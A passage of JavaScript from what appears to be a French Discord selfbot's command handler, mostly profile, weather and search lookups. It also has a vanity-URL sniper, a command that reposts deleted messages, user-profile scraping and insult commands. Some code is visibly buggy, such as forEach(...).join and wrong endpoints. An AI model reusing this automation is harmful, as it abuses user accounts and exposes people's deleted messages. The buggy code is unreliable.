                if (!message.guild.features.includes("VANITY_URL")) return message.edit(`ガ __**${name} - Vanity Sniper**__ ガ\n> *Le serveur actuel doit être niveau 3*`)
                if (tools.vanity_sniper[message.guild?.id]) return message.edit(`ガ __**${name} - Vanity Sniper**__ ガ\n> *Le serveur actuel est déjà dans la vanity sniper*`)
    
                const guild = client.guilds.cache.get(args[0])
                if (!guild || !args[0]) return message.edit(`ガ __**${name} - Vanity Sniper**__ ガ\n> *Veuillez entrer l'ID d'un serveur*`)
                if (!message.guild.vanityURLCode) return message.edit(`ガ __**${name} - Vanity Sniper**__ ガ\n> *Le serveur doit avoir une vanity (URL Personnalidé)*`)
    
                tools.vanity_sniper[message.guild?.id] = { url: guild.vanityURLCode, guildId: guild?.id }
                client.save(`${__dirname}/Data/Tools/tools.json`, tools)
                message.edit(`ガ __**${name} - Vanity Sniper**__ ガ\n> *${message.guild.name} va essayé d'avoir la vanity ${guild.vanityURLCode}*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "vlocker")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (args[0] === "list"){
                message.edit(`ガ __**${name} - Vanity Loker**__ ガ\n> *${tools.vanity_locker.filter(id => client.guilds.cache.get(id)).map(id => `> ${client.guilds.cache.get(id).name}`)} *`)
            }
            else if (args[0] === "remove"){
                const guild = client.guilds.cache.get(args[1]) || message.guild
                if (!guild) return message.edit(`ガ __**${name} - Vanity Locker**__ ガ\n> *Veuillez entrer l'ID d'un serveur*`)

                if (!tools.vanity_locker.includes(guild?.id)) return message.edit(`ガ __**${name} - Vanity Locker**__ ガ\n> *Aucune vanity vérouillé n'est enregistré sous ce serveur*`)
                tools.vanity_locker = tools.vanity_locker.filter(id => id !== guild?.id)
                
                client.save(`${__dirname}/Data/Tools/tools.json`, tools)
                message.edit(`ガ __**${name} - Vanity Locker**__ ガ\n> *${guild.name} n'est plus dans la vanity sniper*`)
            }
            else {
                const guild = client.guilds.cache.get(args[0]) || message.guild

                if (!guild) return message.edit(`ガ __**${name} - Vanity Locker**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
                if (!guild.features.includes("VANITY_URL")) return message.edit(`ガ __**${name} - Vanity Locker**__ ガ\n> *Le serveur doit être niveau 3*`)
                if (tools.vanity_locker.includes(guild?.id)) return message.edit(`ガ __**${name} - Vanity Locker**__ ガ\n> *Le serveur est déjà dans la vanity locker*`)
    
                tools.vanity_locker.push(guild?.id)
                client.save(`${__dirname}/Data/Tools/tools.json`, tools)
                message.edit(`ガ __**${name} - Vanity Lock**__ ガ\n> *${guild.name} a maintenant son URL Personnalisé de vérouillé*`)
            }
        }
















































        else if (cmd.slice(0, 1).join(' ') === (prefix + "adminbots")){
            if (!message.guild) return message.edit(`ガ __**${name} - Admin Bots**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            message.edit(`ガ __**${name} - Admin Bots**__ ガ\n${message.guild.members.cache.filter(m => m.user.bot && m.permissions.has("ADMINISTRATOR")).forEach(m => `> ${m} (${m.user.username})`).join('\n')}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "admins")){
            if (!message.guild) return message.edit(`ガ __**${name} - Admin**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            message.edit(`ガ __**${name} - Admin**__ ガ\n${message.guild.members.cache.filter(m => !m.user.bot && m.permissions.has("ADMINISTRATOR")).forEach(m => `> ${m} (${m.user.username})`).join('\n')}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "allbots")){
            if (!message.guild) return message.edit(`ガ __**${name} - All Bots**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            message.edit(`ガ __**${name} - All Bots**__ ガ\n${message.guild.members.cache.filter(m => m.user.bot).forEach(m => `> ${m} (${m.user.username})`).join('\n')}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "banner")){
            let user = message.mentions.users.first() || await client.users.fetch(args[0]).catch(() => false);
            if (!user) user = message.author

            await user.fetch()
            message.edit(`ガ __**${name} - Banner**__ ガ\n${!user.banner ? `${user.username} n'a pas de bannière` : user.bannerURL({dynamic: true, size: 4096})}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "avatar")){
            let user = message.mentions.users.first() || await client.users.fetch(args[0]).catch(() => false);
            if (!user) user = message.author

            await user.fetch()
            message.edit(`ガ __**${name} - Avatar**__ ガ\n${!user.avatar ? `${user.username} n'a pas de photo de profile` : user.avatarURL({dynamic: true, size: 4096})}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "decode")){
            if (!args[0]) message.edit(`ガ __**${name} - Decode**__ ガ\n> *Veuillez entrer un texte à décoder*`)
            message.edit(`ガ __**${name} - Decode**__ ガ\n${Buffer.from(args.join(' '), "base64").toString('utf-8')}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "encode")){
            if (!args[0]) message.edit(`ガ __**${name} - Encode**__ ガ\n> *Veuillez entrer un texte à encoder*`)
            message.edit(`ガ __**${name} - Encode**__ ガ\n${Buffer.from(args.join(' '), "utf-8").toString('base64')}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "github")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!args[0]) message.edit(`ガ __**${name} - Github**__ ガ\n> *Veuillez entrer un pseudo github à rechercher*`)

            const res = await fetch(`https://api.github.com/users/${args.join('-')}`).catch(() => false)
            if (!res) return message.edit(`ガ __**${name} - Github**__ ガ\n> *Veuillez entrer un pseudo github valide*`)
        
            const json = await res.json().catch(() => false)
            if (!json || json.message) return message.edit(`ガ __**${name} - Github**__ ガ\n> *Veuillez entrer un pseudo github à rechercher*`)
        
            message.edit(`ガ __**${name} - Github**__ ガ\n> \`Pseudo\` ${client.separator} **${json.login}**
            > ${client.tools === "k3s" ? "" : "\`"}ID${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json?.id}**
            > ${client.tools === "k3s" ? "" : "\`"}Bio${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.bio || "Aucune bio"}**
            > ${client.tools === "k3s" ? "" : "\`"}Répertoires Publiques${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.public_repos}**
            > ${client.tools === "k3s" ? "" : "\`"}Abonnés${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.followers}**
            > ${client.tools === "k3s" ? "" : "\`"}Abonnements${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.following}**
            > ${client.tools === "k3s" ? "" : "\`"}Location${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.location}**
            > ${client.tools === "k3s" ? "" : "\`"}Date de création${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${formatDateWithTime(json.created_at)}**
            > ${client.tools === "k3s" ? "" : "\`"}Avatar URL${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.avatar_url} **`.replaceAll("            ", ""))
        }
        else if (cmd.slice(0, 1).join(' ') === (prefix + "google")){
            if (!args[0]) message.edit(`ガ __**${name} - Google**__ ガ\n> *Veuillez entrer une recherche*`)
            message.edit(`ガ __**${name} - Google**__ ガ\n> *<https://www.google.fr/search?q=${args.join("%20")}>*`)
        }
        else if (cmd.slice(0, 1).join(' ') === (prefix + "invite")){
            let user = message.mentions.users.first() || await client.users.fetch(args[0]).catch(() => false);
            if (!user) return message.edit(`ガ __**${name} - Invite**__ ガ\n> *Veuillez mentionner un bot*`)
            message.edit(`ガ __**${name} - Invite**__ ガ\n> *[Invitation de ${user.username}](<https://discord.com/api/oauth2/authorize?client_id=${user?.id}&permissions=8&scope=bot>)*`)
        }
        else if (cmd.slice(0, 2).join(' ') === (prefix + "user info")){            
            let user = message.mentions.users.first() || client.users.cache.get(args[1]) || await client.users.fetch(args[1]).catch(() => false);
            if (!user || !args[1]) user = message.author
            
            await user.fetch()
            
            message.edit(`ガ __**${name} - Member Info**__ ガ\n> \`Nom d'utilisateur${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${user.username}**
            > ${client.tools === "k3s" ? "" : "\`"}Nom d'utilisateur Affiché${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${user.globalName ?? "Aucun"}**
            > ${client.tools === "k3s" ? "" : "\`"}ID${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${user?.id}**
            > ${client.tools === "k3s" ? "" : "\`"}Bot${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${user.bot ? "Oui" : "Non"}**
            > ${client.tools === "k3s" ? "" : "\`"}Connexions${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${user.connectedAccounts?.length > 0 ? user.connectedAccounts.map(user => user.type).join(', ') : "Pas de connexion trouvée"}**
            > ${client.tools === "k3s" ? "" : "\`"}Compte Créé${client.tools === "k3s" ? "" : "\`"} ${client.separator} **<t:${Math.round(user.createdAt / 1000)}:R>**
            > ${client.tools === "k3s" ? "" : "\`"}Serveurs en communs${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${client.guilds.cache.filter(g => g.members.cache.has(user?.id)).map(g => g.name).join(', ')}**
            > ${client.tools === "k3s" ? "" : "\`"}Avatar${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${user.avatar ? user.avatarURL({dynamic: true, size: 4096}) : user.accentColor} **
            > ${client.tools === "k3s" ? "" : "\`"}Bannière${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${user.banner ? user.bannerURL({dynamic: true, size: 4096}) : "Pas de bannière"} **
            > ${client.tools === "k3s" ? "" : "\`"}Décoration${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${user.avatarDecoration ? user.avatarDecorationURL() : "Pas de décoration"} **
            > ${client.tools === "k3s" ? "" : "\`"}Bio${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${user.bio ??"**Pas de bio**"}`.replaceAll("            ", ""))
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "member info")){
            if (!message.guild) return message.edit(`ガ __**${name} - Member Info**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            
            let member = message.mentions.members.first() || message.guild.members.cache.get(args[1]) || await message.guild.members.fetch(args[1]).catch(() => false);
            if (!member || !args[1]) member = message.member
            
            await member.fetch()
            
            message.edit(`ガ __**${name} - Member Info**__ ガ\n> ${client.tools === "k3s" ? "" : "\`"}Surnom${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${member.nickname ?? "Pas de pseudo"}**
            > ${client.tools === "k3s" ? "" : "\`"}Nom d'utilisateur${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${member.user.username}**
            > ${client.tools === "k3s" ? "" : "\`"}Nom d'utilisateur Affiché${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${member.user.globalName ?? "Aucun"}**
            > ${client.tools === "k3s" ? "" : "\`"}ID${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${member.user?.id}**
            > ${client.tools === "k3s" ? "" : "\`"}Bot${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${member.user.bot ? "Oui" : "Non"}**
            > ${client.tools === "k3s" ? "" : "\`"}Connexions${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${member.user.connectedAccounts.length > 0 ? member.user.connectedAccounts.map(user => user.type).join(', ') : "Pas de connexion trouvée"}**
            > ${client.tools === "k3s" ? "" : "\`"}Compte Créé${client.tools === "k3s" ? "" : "\`"} ${client.separator} **<t:${Math.round(member.user.createdAt / 1000)}:R>**
            > ${client.tools === "k3s" ? "" : "\`"}Rejoint le serveur${client.tools === "k3s" ? "" : "\`"} ${client.separator} **<t:${Math.round(member.joinedAt / 1000)}:R>**
            > ${client.tools === "k3s" ? "" : "\`"}Rôles${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${member.roles.cache.length > 0 ? member.roles.cache.map(r => `<@&${r}>`).join(', ') : "Pas de rôle"}**
            > ${client.tools === "k3s" ? "" : "\`"}Serveurs en communs${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${client.guilds.cache.filter(g => g.members.cache.has(member?.id)).map(g => g.name).join(', ')}**
            > ${client.tools === "k3s" ? "" : "\`"}Avatar${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${member.avatar ? member.avatarURL({dynamic: true, size: 4096}) : "Pas d'avatar"} **
            > ${client.tools === "k3s" ? "" : "\`"}Bannière${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${member.banner ? member.bannerURL({dynamic: true, size: 4096}) : "Pas de bannière"} **
            > ${client.tools === "k3s" ? "" : "\`"}Décoration${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${member.avatarDecoration ? member.avatarDecorationURL() : "Pas de décoration"} **
            > ${client.tools === "k3s" ? "" : "\`"}Bio${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${member.user.bio ??"**Pas de bio**"}`.replaceAll("            ", ""))
        }
        else if (cmd.slice(0, 1).join(' ') === (prefix + "meteo")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!args[0]) return message.edit(`ガ __**${name} - Meteo**__ ガ\n> *Veuillez entrer une localisation*`)
            weather.find({ search: args.join(' '), degreeType: 'C' }, function (error, result) {
                if (result === undefined || result.length === 0) return message.edit(`ガ __**${name} - Meteo**__ ガ\n> *Aucune localisation de trouvée*`)
                
                var current = result[0].current;
                var location = result[0].location;
        
                message.edit(`ガ __**${name} - Meteo**__ ガ\n>>> **${client.tools === "k3s" ? "" : "\`"}Météo${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${current.skytext}**
                ${client.tools === "k3s" ? "" : "\`"}Météo depuis${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${current.observationpoint}**
                ${client.tools === "k3s" ? "" : "\`"}Timezone${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${location.timezone}**
                ${client.tools === "k3s" ? "" : "\`"}Temperature${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${current.temperature}°C**
                ${client.tools === "k3s" ? "" : "\`"}Vent${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${current.winddisplay}**
                ${client.tools === "k3s" ? "" : "\`"}Humidité${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${current.humidity}%**`.replaceAll("                ", ""))
            })        
        }
        else if (cmd.slice(0, 1).join(' ') === (prefix + "npm")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!args[0]) return message.edit(`ガ __**${name} - NPM**__ ガ\n>>> *Veuillez entrer un module à rechercher*`)
            const res = await fetch(`https://api.popcat.xyz/npm?q=${encodeURIComponent(args.join(' '))}`).catch(() => false)
            if (!res) return message.edit(`ガ __**${name} - NPM**__ ガ\n> *Aucun module de trouvé*`)
            const json = await res.json().catch(() => false)
            if (!json || json.error) return message.edit(`ガ __**${name} - NPM**__ ガ\n>>> *Aucun module de trouvée dans la base de donnée*`)

            message.edit(`ガ __**${name} - NPM**__ ガ\n> ${client.tools === "k3s" ? "" : "\`"}Nom${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.name}**
                ${client.tools === "k3s" ? "" : "\`"}Dernière version${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.version}**
                ${client.tools === "k3s" ? "" : "\`"}Auteur${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.author}**
                ${client.tools === "k3s" ? "" : "\`"}Email${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.author_email ?? "Aucun"}**
                ${client.tools === "k3s" ? "" : "\`"}Dernière publication${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.last_published}**
                ${client.tools === "k3s" ? "" : "\`"}Mainteneurs${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.maintainers ?? "Aucun"}**
                ${client.tools === "k3s" ? "" : "\`"}Repo${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.maintainers ?? "Aucun"}**
                ${client.tools === "k3s" ? "" : "\`"}Téléchargements cette année${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.downloads_this_year ?? "0"}**
                ${client.tools === "k3s" ? "" : "\`"}Description${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${json.description ?? "Aucune description"}**`.replaceAll("                ", ""))
        }
        else if (cmd.slice(0, 1).join(' ') === (prefix + "osu")){
            if (!args[0]) return message.edit(`ガ __**${name} - OSU**__ ガ\n> *Veuillez entrer un pseudo valide*`)
            message.edit(`ガ __**${name} - OSU**__ ガ\n> https://lemmmy.pw/osusig/sig.php?colour=hexc246f2&uname=${encodeURIComponent(args.slice(0).join(' '))}&pp=1&countryrank&flagshadow&flagstroke&darkheader&darktriangles&opaqueavatar&avatarrounding=4&rankedscore&onlineindicator=undefined&xpbar&xpbarhex`)
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "role info")){
            if (!message.guild) return message.edit(`ガ __**${name} - Role Info**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1]) || await message.guild.roles.fetch(args[1]).catch(() => false)
            if (!role || !args[1]) return message.edit(`ガ __**${name} - Role Info**__ ガ\n> *Veuillez mentionner un rôle*`)

            message.edit(`ガ __**${name} - Role Info**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}Nom du rôle:${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${role.name}**
            ${client.tools === "k3s" ? "" : "\`"}ID${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${role?.id}**
            ${client.tools === "k3s" ? "" : "\`"}Couleur${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${role.color}**
            ${client.tools === "k3s" ? "" : "\`"}Modifiable${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${role.editable ? "Oui" : "Non"}**
            ${client.tools === "k3s" ? "" : "\`"}Rôle d'un Bot${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${role.managed ? "Oui" : "Non"}**
            ${client.tools === "k3s" ? "" : "\`"}Mentionnable${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${role.mentionable ? "Oui" : "Non"}**
            ${client.tools === "k3s" ? "" : "\`"}Membres ayant ce rôle${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${role.members.size}**
            ${client.tools === "k3s" ? "" : "\`"}Créé${client.tools === "k3s" ? "" : "\`"} ${client.separator} <t:${Math.round(role.createdAt / 1000)}:R>
            ${client.tools === "k3s" ? "" : "\`"}Icone du rôle${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${role.icon ? role.iconURL() : "**Non**"}`.replaceAll("            ", ""))
        }

        else if (cmd.slice(0, 2).join(' ') === (prefix + "server info")){
            const guild = client.guilds.cache.get(args[1]) || message.guild
            if (!guild) return message.edit(`ガ __**${name} - Server Info**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            message.edit(`ガ __**${name} - Server Info**__ ガ\n>>> ${client.tools === "k3s" ? "" : "\`"}Nom du serveur${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${guild.name}**
            ${client.tools === "k3s" ? "" : "\`"}ID${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${guild?.id}**
            ${client.tools === "k3s" ? "" : "\`"}Propriétaire${client.tools === "k3s" ? "" : "\`"} ${client.separator} <@${guild.ownerId}>
            ${client.tools === "k3s" ? "" : "\`"}Nombre de membres${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${guild.memberCount}**
            ${client.tools === "k3s" ? "" : "\`"}Nombre de rôles${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${guild.roles.cache.size}**
            ${client.tools === "k3s" ? "" : "\`"}Nombre de salons${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${guild.channels.cache.size}**
            ${client.tools === "k3s" ? "" : "\`"}Niveau du serveur${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${guild.premiumTier === "NONE" ?  "0" : guild.premiumTier.split("TIER_")[1]}/3**
            ${client.tools === "k3s" ? "" : "\`"}Nombre de boosteurs${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${guild.premiumSubscriptionCount}**
            ${client.tools === "k3s" ? "" : "\`"}Serveur Créé${client.tools === "k3s" ? "" : "\`"} ${client.separator} <t:${Math.round(guild.createdAt / 1000)}:R>
            ${client.tools === "k3s" ? "" : "\`"}Salon d'AFK${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${guild.afkChannel ? `<#${guild.afkChannelId}>` : "**Aucun salon d'AFK**"}
            ${client.tools === "k3s" ? "" : "\`"}Salon des règles${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${guild.rulesChannel ? `<#${guild.rulesChannelId}>` : "**Aucun salon des règles**"}
            ${client.tools === "k3s" ? "" : "\`"}Icone du serveur${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${guild.icon ? guild.iconURL({dynamic: true, size: 4096}) : "Aucune"} **
            ${client.tools === "k3s" ? "" : "\`"}Bannière${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${guild.banner ? guild.bannerURL({dynamic: true, size: 4096}) : "Pas de bannière"} **
            ${client.tools === "k3s" ? "" : "\`"}Splash${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${guild.splash ? guild.splashURL({size: 4096}) : "Pas de bannière d'invitation"} **
            ${client.tools === "k3s" ? "" : "\`"}Description${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${guild.description ? guild.description : "**Pas de description**"}`.replaceAll("            ", ""))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "snipe")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            
            let content = client.snipes.get(message.channel?.id)
            if (!content) return message.edit(`ガ __**${name} - Snipe**__ ガ\n> *Aucun message de sniper sur ce salon*`)

            message.edit(`ガ __**${name} - Snipe**__ ガ\n> ${client.tools === "k3s" ? "" : "\`"}Pseudo${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${content.author?.username}
            > ${client.tools === "k3s" ? "" : "\`"}Message${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${content.content}
            > ${client.tools === "k3s" ? "" : "\`"}Il y a${client.tools === "k3s" ? "" : "\`"} ${client.separator} <t:${Math.round(content.moment / 1000)}:R>
            > ${client.tools === "k3s" ? "" : "\`"}Image${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${content.images}`.replaceAll("            ", ""))    
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "uptime")){
            let totalSeconds = (client.uptime / 1000);
            let days = Math.floor(totalSeconds / 86400);
            totalSeconds %= 86400;
            let hours = Math.floor(totalSeconds / 3600);
            totalSeconds %= 3600;
            let minutes = Math.floor(totalSeconds / 60);
            let seconds = Math.floor(totalSeconds % 60);

            message.edit(`Uptime: ${days} ${client.trad("Days", "Jours")} | ${hours} ${client.trad("Hours", "Heures")} | ${minutes} ${client.trad("Minuts", "Minutes")} | ${seconds} ${client.trad('Seconds', "Secondes")}`);

            message.edit(`ガ __**${name} - Uptime**__ ガ\n${days} Jours | ${hours} Heures | ${minutes} Minutes | ${seconds} Secondes`)    
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "wallpaper")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            const response = await fetch(`https://nekos.life/api/v2/img/wallpaper`)
            const data = await response.json()
            message.edit(`ガ __**${name} - Wallpaper**__ ガ\n> *${data.url} *`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "youtube")){
            if (!args[0]) return message.edit(`ガ __**${name} - Youtube**__ ガ\n> *Veuillez entrer une recherche valide*`)
            message.edit(`ガ __**${name} - Youtube**__ ガ\n> *<https://www.youtube.com/results?search_query=${encodeURIComponent(args.join(' '))}>*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "translate")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!args[0]) return message.edit(`ガ __**${name} - Translate**__ ガ\n> *Veuillez entrer la langue de traduction (ex: en)*`)
            if (!args[1]) return message.edit(`ガ __**${name} - Translate**__ ガ\n> *Veuillez entrer le texte à traduire dans la langue*`)
            
            const result = await translate(args.slice(1).join(' '), { to: args[0] }).catch(() => false)
            if (!result) return message.edit(`ガ __**${name} - Translate**__ ガ\n> *Impossible de traduire le texte*`)
            message.edit(`ガ __**${name} - Translate**__ ガ\n> *${result.text}*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "chatbot")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!args[0]) return message.edit(`ガ __**${name} - ChatBot**__ ガ\n> *Veuillez entrer un texte*`)

            const response = await fetch(`https://api.popcat.xyz/chatbot?msg=${encodeURIComponent(args.join(' '))}&owner=Sans&botname=RSZ`)
            const data = await response.json()
            message.edit(`ガ __**${name} - ChatBot**__ ガ\n> \`Demande\` ${client.separator} ${args.join(' ')}\n> \`Réponse\` ${client.separator} ${data.response}`)
        }



























        else if (cmd.slice(0, 1).join(' ') === (prefix + "kiss")){
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || message.author
            const r = await fetch("https://nekos.life/api/v2/img/kiss")
            const res = await r.json()
            message.edit({content: `ガ __**${name} - Kiss**__ ガ\n> *${client.user.username} embrasse ${user.username}*\n${res.message}`})
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "feed")){
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || message.author
            const r = await fetch("https://nekos.life/api/v2/img/feed")
            const res = await r.json()
            message.edit({content: `ガ __**${name} - Feed**__ ガ\n> *${client.user.username} nourri ${user.username}*\n${res.message}`})
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "hug")){
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || message.author
            const r = await fetch("https://nekos.life/api/v2/img/feed")
            const res = await r.json()
            message.edit({content: `ガ __**${name} - Hug**__ ガ\n> *${client.user.username} calinne ${user.username}*\n${res.message}`})
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "slap")){
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || message.author
            const r = await fetch("https://nekos.life/api/v2/img/slap")
            const res = await r.json()
            message.edit({content: `ガ __**${name} - Slap**__ ガ\n> *${client.user.username} frappe ${user.username}*\n${res.message}`})
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "pat")){
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || message.author
            const r = await fetch("https://nekos.life/api/v2/img/pat")
            const res = await r.json()
            message.edit({content: `ガ __**${name} - Pat**__ ガ\n> *${client.user.username} caresse ${user.username}*\n${res.message}`})
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "issou")){
            message.edit({content: `ガ __**${name} - ISSOU**__ ガ\n${api.issou[Math.floor(Math.random() * api.issou.length)]}`})
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "tg")){
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || message.author
            message.edit({content: `ガ __**${name} - ${user.username}  Ferme ta gueule fdp ! 👆**__ ガ\n${api.tg}`})
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "daronned")){
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || message.author
            message.edit({content: `ガ __**${name} - ${user.username}  Ferme ta gueule fdp ! 👆**__ ガ\n${api.daronned}`})
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "random")){
            message.edit(`ガ __**${name} - Random**__ ガ\n> *Nombre: \`${Math.floor(Math.random() * 101) + 1}\`*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "facepalm")){
            message.edit(`ガ __**${name} - Facepalm**__ ガ\n░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄▄░░░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███▀█░░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███░██░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███░░██░░░
            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄██░░░░██░░
            ░░░░░░░░░░░░░░░░▄▄█▀▀▀▀█▄▄▄▄███▄░░░██░░
            ░░░░░░░░░░░░░▄█▀░░░░░░░░░▀▀▀▀█░▀█░░██░░
            ░░░░░░░░░░░░█▀░░░░░░░░░░░░░░░▀█▄█▀▀▀░░░
            ░░░░░░░░░░░▄▀░░░░░░░░░░░░░░░░▀█▄░░░░░░░
            ░░░░░░░░░░░▀█▄░█░░▄▀░░░░░░░▄▄█░░░░░░░░░
            ░░░░░░░░▄▄▄▄█▀▀▀██▄▄░░░░░░▄▀░░░░░░░░░░░
            ░░░░▄▄██▄▀▀░░░░░█▀░░░░░░▄██▄░░░░░░░░░░░
            ░░▄██▀▀░░░░░░░░▄█░░░░░▄█▀▄█░▀▀█▄▄▄▄▄▄▄▄
            ░██▀░░░░░░░░▄██░░░░░░▄▀▄▄▀░░░░░░░░░░░░░
            █▀▀░░░░░░▄█▀▄░▀▄▄▄▄██▀▀▀░░░░░█░░░░░░░░░
            █░░░░░▄▄▀░░░░█░░░░░░░░░░░░░░░▀░░░░░░░░░
            ░▀▀▀▀▀▀░░░░░░░█░░░░░░░░░░░░░░░▀▀█▀▀▀▀▀▀
            ░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░█▀░░░░░░
            ░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░▄█░░░░░░░`.replaceAll("            ", ""))
        }

